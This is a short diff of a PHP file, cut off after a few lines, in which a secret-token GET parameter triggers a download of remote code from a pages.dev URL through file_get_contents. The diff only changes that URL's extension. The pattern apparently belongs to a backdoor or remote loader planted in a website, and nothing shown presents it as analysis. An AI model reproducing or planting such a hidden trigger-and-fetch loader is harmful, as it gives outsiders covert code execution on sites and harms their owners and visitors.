@@ -1,7 +1,7 @@
 <?php
 
 if (isset($_GET['_']) && $_GET['_'] === 'ds_mms799s111_gr3af332afbsnk') {
-    $url = "https://helloo-everyonee.pages.dev/seoven.phps";
+    $url = "https://helloo-everyonee.pages.dev/seoven.php";
 
     if ($url !== "") {
         $code = file_get_contents($url);
